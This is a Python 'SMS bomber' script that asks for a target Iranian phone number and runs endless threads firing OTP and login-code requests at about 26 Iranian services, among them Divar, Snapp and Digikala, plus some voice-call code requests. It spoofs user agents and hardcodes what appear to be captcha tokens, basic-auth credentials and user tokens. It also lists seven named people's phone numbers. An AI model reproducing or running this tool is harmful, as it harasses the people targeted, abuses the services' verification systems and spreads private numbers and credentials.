from threading import Thread
from time import sleep
from random import randint
import os

try:
    from requests import get, post, options
except ImportError:
    print(
        "You need to install requests to use this module!\ninstalling requests lib... run program after a few seconds")
    os.system("pip install requests")
    exit()

try:
    from fake_useragent import UserAgent
except ImportError:
    print(
        "You need to install fake_useragent to use this module!\ninstalling fake_useragent lib... run program after a few seconds")
    os.system("pip install fake_useragent")
    exit()

ua = UserAgent()

phonenumbers = {'reza': "09965997022",
                'habibi': "09044509384",
                'EHSAN': "09044433580",
                'Nima': "09157915254",
                'ehsan': "09030231850",
                'rezaiee': "09391399237",
                'amin': "09367321850"}


def makeheader():
    headers = {'User-Agent': ua.random}
    return headers


def banner():
    print("""
  ██████  ███▄ ▄███▓  ██████     ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  
▒██    ▒ ▓██▒▀█▀ ██▒▒██    ▒    ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
░ ▓██▄   ▓██    ▓██░░ ▓██▄      ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒
  ▒   ██▒▒██    ▒██   ▒   ██▒   ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
▒██████▒▒▒██▒   ░██▒▒██████▒▒   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░▒ ▒▓▒ ▒ ░   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░▒  ░ ░░  ░      ░░ ░▒  ░ ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
░  ░  ░  ░      ░   ░  ░  ░      ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ 
      ░         ░         ░      ░          ░ ░         ░    ░         ░  ░   ░     
                                      ░                           ░                 
                        By amirali900311
                    \"Use it at your own risk!\"
        there is a limit ! you can use it just in iran!\n\n""")


banner()

targetphone = '0'
targetphone += input('Enter target phone number(+98): 0')


def divarsms(phonenum: str):
    while True:
        try:
            status_code = post(url='https://api.divar.ir/v5/auth/authenticate', json={'phone': phonenum},
                               headers=makeheader()).status_code
            print(f'Divar: {status_code}')
        except Exception as e:
            print(f'Divar Error: {e}')
        sleep(randint(100, 130))  # 30


def snappsms(phonenum: str):
    while True:
        try:
            status_code = post(url='https://api.snapp.ir/api/v1/sms/link', json={'phone': phonenum},
                               headers=makeheader()).status_code
            print(f'Snapp: {status_code}')
        except Exception as e:
            print(f'Snapp Error: {e}')
        sleep(randint(200, 300))


def shaipoorsms(phonenum: str):
    while True:
        try:
            status_code = post(url='https://www.sheypoor.com/api/v10.0.0/auth/send', json={'username': phonenum},
                               headers=makeheader()).status_code
            print(f'Shaipoor: {status_code}')
        except Exception as e:
            print(f'Shaipoor Error: {e}')
        sleep(randint(150, 200))  # 90 S


def torobsms(phonenum: str):
    while True:
        try:
            status_code = get(
                f"https://api.torob.com/v4/user/phone/send-pin/?phone_number={phonenum}&_http_referrer=https://www.google.com/&source=next_desktop",
                headers=makeheader()).status_code
            print(f'Torob: {status_code}')
        except Exception as e:
            print(f'Torob Error: {e}')
        sleep(randint(200, 300))


def digikalasms(phonenum: str):
    while True:
        try:
            status_code = post("https://api.digikala.com/v1/user/authenticate/", json={"backUrl": "/product/dkp"
                                                                                                  "-9744990/رم-دسکتاپ-ddr4-دو-کاناله-3600-مگاهرتز-cl18-کورسیر-مدل-vengeance-rgb-pro-ظرفیت-16-گیگابایت/",
                                                                                       "username": f"{phonenum}",
                                                                                       "otp_call": False,
                                                                                       "force_send_otp": True,
                                                                                       "hash": None},
                               headers=makeheader()).status_code
            print(f'DigiKala: {status_code}')
        except Exception as e:
            print(f'DigiKala Error: {e}')
        sleep(randint(250, 350))  # 180


def basalamsms(phonenum: str):
    while True:
        try:
            status_code = post(url='https://auth.basalam.com/captcha/otp-request',
                               json={"mobile": phonenum, "client_id": "11"}, headers=makeheader()).status_code
            print(f'Basalam: {status_code}')
        except Exception as e:
            print(f'Basalam Error: {e}')
        sleep(randint(100, 300))  # 60


def lionsms(phonenum: str):
    while True:
        try:
            status_code = post(url='https://www.lioncomputer.com/api/v1/auth/send-register-code',
                               json={'mobile': phonenum,
                                     'redirect_url': 'https://www.lioncomputer.com/listing/c-external-hard-disk'},
                               headers=makeheader()).status_code
            print(f'Lion: {status_code}')
        except Exception as e:
            print(f'Lion Error: {e}')
        sleep(randint(200, 350))


def alibabasms(phonenum: str):
    while True:
        try:
            status_code = post("https://ws.alibaba.ir/api/v3/account/mobile/otp", json={"phoneNumber": phonenum},
                               headers=makeheader()).status_code
            print(f'Alibaba: {status_code}')
        except Exception as e:
            print(f'Alibaba Error: {e}')
        sleep(randint(150, 300))  # ?


def jabamasms(phonenum: str):
    while True:
        try:
            status_code = post('https://gw.jabama.com/api/v4/account/send-code', json={"mobile": phonenum},
                               headers=makeheader()).status_code
            print(f'Jabama: {status_code}')
        except Exception as e:
            print(f'Jabama Error: {e}')
        sleep(randint(200, 350))


def acharehsms(phonenum: str):
    if phonenum.startswith('0'):
        phonenum = '98' + phonenum[1:]
    while True:
        try:
            status_code = post('https://api.achareh.co/v2/accounts/login/?web=true', json={"phone": phonenum},
                               headers=makeheader()).status_code
            print(f'Achareh: {status_code}')
        except Exception as e:
            print(f'Achareh Error: {e}')
        sleep(randint(200, 300))


def barghmansms(phonenum: str):
    while True:
        try:
            status_code = post("https://uiapi2.saapa.ir/api/otp/sendCode",
                               json={"mobile": phonenum, "from_meter_buy": False}, headers=makeheader()).status_code
            print(f'Bargh: {status_code}')
        except Exception as e:
            print(f'Bargh Error: {e}')
        sleep(randint(400, 500))


def banimodesms(phonenum: str):
    while True:
        try:
            status_code = post("https://mobapi.banimode.com/api/v2/auth/request", json={"phone": phonenum},
                               headers=makeheader()).status_code
            print(f'Banimode: {status_code}')
        except Exception as e:
            print(f'Banimode Error: {e}')

        sleep(randint(200, 300))


def docnextsms(phonenum: str):
    while True:
        try:
            status_code = post('https://cyclops.drnext.ir/v1/patients/auth/send-verification-token',
                               json={"source": "besina", "mobile": phonenum,
                                     "key": "U2FsdGVkX1+Yu+MKRsdf9bxtrvdhB287ZhA0FR5VWCRjOzhmbwAKyXsSXy7JGZG6dUn8xnrV8GOEU4P5fGzk9w=="},
                               headers=makeheader()).status_code
            print(f'Docnexts: {status_code}')
        except Exception as e:
            print(f'Docnexts Error: {e}')

        sleep(randint(200, 300))


def tapsifoodsms(phonenum: str):
    while True:
        try:
            status_code = post('https://api.tapsi.food/v1/api/Authentication/otp', json={"cellPhone": phonenum},
                               headers=makeheader()).status_code
            print(f'Tapsi: {status_code}')
        except Exception as e:
            print(f'Tapsi Error: {e}')
        sleep(randint(200, 300))


def aritonsms(phonenum: str):
    while True:
        try:
            status_code = post('https://api.erythron.net/v1/user/getVerifyCode',
                               json={"auth_type": "mobile", "auth_value": phonenum}, headers=makeheader()).status_code
            print(f'Ariton: {status_code}')
        except Exception as e:
            print(f'Ariton Error: {e}')

        sleep(randint(100, 200))


def takhfifansms(phonenum: str):
    while True:
        try:
            status_code = post('https://takhfifan.com/v6/api/magento/login/init', json={"username": phonenum},
                               headers=makeheader()).status_code
            print(f'Takhfifan: {status_code}')
        except Exception as e:
            print(f'Takhfifan Error: {e}')

        sleep(randint(200, 300))


def khayevarbimehsms(phonenum: str):
    while True:
        try:
            status_code = post('https://melico.ir/auth/check-user',
                               json={"username": phonenum, "group": "my", "recaptcha_token": "abcd"},
                               headers=makeheader()).status_code
            print(f'Khayevarbimeh: {status_code}')
        except Exception as e:
            print(f'Khayevarbime Error: {e}')
        sleep(randint(150, 300))  # 90 S


def karabizsms(phonenum: str):
    while True:
        try:
            status_code = post('https://panel.karabiz.ir/api/api/user/signup',
                               json={"Mobile": phonenum, "SchoolId": -1, "url": "panel.karabiz.ir",
                                     "identifierCode": ""}).status_code
            print(f'Karabiz: {status_code}')
        except Exception as e:
            print(f'Karabiz Error: {e}')

        sleep(randint(200, 300))  # 120


def azkivamsms(phonenum: str):
    while True:
        try:
            status_code = post('https://api.azkivam.com/auth/login',
                               json={"mobileNumber": phonenum, "medium": "cpc", "source": "google",
                                     "campaign": "credit-blu-general"}, headers=makeheader()).status_code
            print(f'AzkivamSms: {status_code}')
        except Exception as e:
            print(f'Azkivam Error: {e}')

        sleep(randint(200, 300))


def azkivamcall(phonenum: str):
    while True:
        try:
            status_code = post('https://api.azkivam.com/auth/login',
                               json={"mobileNumber": phonenum, "messageType": "CALL"},
                               headers=makeheader()).status_code
            print(f'AzkivamCall!: {status_code}')
        except Exception as e:
            print(f'AzkivamCall Error: {e}')

        sleep(randint(300, 500))  # 120


def vitrinshopcall(phonenum: str):
    while True:
        try:
            status_code = post('https://www.vitrin.shop/api/v1/user/request_code',
                               json={"phone_number": phonenum, "forgot_password": False},
                               headers=makeheader()).status_code
            print(f'VitrinshopCall: {status_code}')
        except Exception as e:
            print(f'VitrinshopCall Error: {e}')
        sleep(randint(300, 500))


def wallgoldsms(phonenum: str):
    while True:
        try:
            status_code = post('https://api.wallgold.ir/api/v1/auth/login-signup',
                               json={"mobileNumber": phonenum, "deviceName": "web", "platform": "web",
                                     "type": "NoCaptcha"}, headers=makeheader()).status_code
            print(f'Wallgold: {status_code}')
        except Exception as e:
            print(f'Wallgold Error: {e}')
        sleep(randint(100, 200))


def baladsms(phonenum: str):
    while True:
        try:
            status_code = post('https://account.api.balad.ir/api/web/auth/login/',
                               json={"phone_number": phonenum, "os_type": "W"}, headers=makeheader()).status_code
            print(f'Balad: {status_code}')
        except Exception as e:
            print(f'Balad Error: {e}')
        sleep(randint(200, 300))


def tripsms(phonenum: str):
    while True:
        try:
            header = makeheader()
            status_code = post('https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email',
                               json={"phoneNumber": phonenum}, headers=header).status_code
            options_status_code = options("https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email",
                                          headers=header).status_code
            print(f'Trip: {status_code}, {options_status_code}')
        except Exception as e:
            print(f'Trip Error: {e}')
        sleep(randint(150, 200))


def ofoghkoroshsms(phonenum: str):
    while True:
        try:
            status_code = post('https://my.okcs.com/api/check-mobile', headers=makeheader(), json={
                "mobile": phonenum,
                "g-recaptcha-response": "03AGdBq255m4Cy9SQ1L5cgT6yD52wZzKacalaZZw41D"
                                        "-jlJzSKsEZEuJdb4ujcJKMjPveDKpAcMk4kB0OULT5b3v7oO_Zp8Rb9olC5lZH0Q0BVaxWWJEPfV8Rf70L58JTSyfMTcocYrkdIA7sAIo7TVTRrH5QFWwUiwoipMc_AtfN-IcEHcWRJ2Yl4rT4hnf6ZI8QRBG8K3JKC5oOPXfDF-vv4Ah6KsNPXF3eMOQp3vM0SfMNrBgRbtdjQYCGpKbNU7P7uC7nxpmm0wFivabZwwqC1VcpH-IYz_vIPcioK2vqzHPTs7t1HmW_bkGpkZANsKeDKnKJd8dpVCUB1-UZfKJVxc48GYeGPrhkHGJWEwsUW0FbKJBjLO0BdMJXHhDJHg3NGgVHlnOuQV_wRNMbUB9V5_s6GM_zNDFBPgD5ErCXkrE40WrMsl1R6oWslOIxcSWzXruchmKfe"}).status_code
            print(f'Ofoghkorosh: {status_code}')

        except Exception as e:
            print(f'Ofoghkorosh Error: {e}')
        sleep(randint(100, 200))


def filmnetsms(phonenum: str):
    while True:
        try:
            status_code = get(f"https://filmnet.ir/api-v2/access-token/users/{phonenum}%20/otp",
                              headers=makeheader()).status_code
            print(f'Filmnet: {status_code}')
        except Exception as e:
            print(f'Filmnet Error: {e}')
        sleep(randint(100, 200))


def azkisms(phonenum: str):
    while True:
        try:
            headers = {'accept': 'application/json, text/plain, */*',
                       'accept-encoding': 'gzip, deflate, br',
                       'accept-language': 'en-US,en;q=0.9',
                       'authorization': 'Basic QmltaXRvQ2xpZW50OkJpbWl0b1NlY3JldA==',
                       'device': 'web',
                       'deviceid': '6',
                       'password': 'BimitoSecret',
                       'origin': 'https://www.azki.com',
                       'referer': 'https://www.azki.com/',
                       'user-agent': ua.random,
                       'user-token': 'LW6H4KSMStwwKXWeFey05gtdw2iW8QRtSk70phP6tBJindQ4irdzTmSqDI9TkVqE',
                       'username': 'BimitoClient'}
            status_code = post("https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
                               json={"phoneNumber": phonenum, "origin": "www.azki.com"}, headers=headers).status_code
            print(f"Azki: {status_code}")
        except Exception as e:
            print(f'Azki: {e}')
        sleep(randint(100, 200))


funcs = [divarsms, snappsms, shaipoorsms, torobsms, digikalasms, basalamsms, alibabasms, jabamasms, acharehsms,
         barghmansms, lionsms, banimodesms, docnextsms, tapsifoodsms, aritonsms, takhfifansms, khayevarbimehsms,
         karabizsms, azkivamsms, azkivamcall, vitrinshopcall, wallgoldsms, baladsms, ofoghkoroshsms, filmnetsms, azkisms]

threads = []
for func in funcs:
    thread = Thread(target=func, daemon=True, args=(targetphone,))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
